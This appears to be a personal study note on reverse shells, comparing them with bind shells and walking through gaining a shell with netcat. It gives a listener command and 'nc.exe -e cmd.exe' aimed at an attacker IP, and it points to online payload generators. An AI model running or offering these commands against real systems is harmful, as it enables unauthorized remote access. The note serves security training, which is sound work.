
+ A reverse shell is a type of remote shell where the target connects directly to a listener on the attacker's system, consequently allowing for execution of commands on the target system.

![[Pasted image 20231018011642.png]]
- Target connects to Netcat listener on Attacker system.


**Advantages of a reverse shell over bind shell**

1. In case of a reverse shell, the listener is setup on the attacker machine. The target machine instead connects to the attacker machine. 
2. Outgoing traffic from a system is rarely blocked by security mechanisms, this will help the target machine connect to the attacker without raising much suspicion. 

**Disadvantage of a reverse shell**

1. In order to establish a connection between the attacker and the target machine, the target machine needs to know the IP address of the attacker machine. This poses the risk of having the attacker IP address leaked. 

### How to gain reverse shell access using `nc` ?

1. Transfer the `nc.exe` file from the Linux machine to the Windows machine.

2. Set up the listener in the attacker machine.
```
nc -lnvp <port>
```

3. Connect to the attacker machine using `nc.exe`
```
nc.exe -nv <attacker-ip> <port> -e cmd.exe
```

4. This will provide us with a reverse command shell session on our Linux machine.

5. This process can be repeated on multiple operating systems regardless of whether its a Windows or Linux system. 

6. Since it's a reverse shell connection, the connection doesn't need to be made by `nc`. It can also be made using a `PowerShell` or `Bash` code.

### Cheat Sheet for Reverse Shell 

1. Codes in various language are available in the `PayloadsAllTheThings` Github repository to connect to a `nc` listener running on the attacker machine.
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

2. We can use the https://www.revshells.com/ website to generate reverse shells, bind shells or `MSFVenom` payloads for both Linux and Windows in the language of our choice. 

3. We'll use a PowerShell payload from the `revshells` website to get a reverse shell connection.

4. Set up the listener in the attacker machine. `nc -lnvp 80`

5. Paste the copied `shellcode` in `cmd` of the target Windows system and run. We should get a reverse shell on our attacker machine.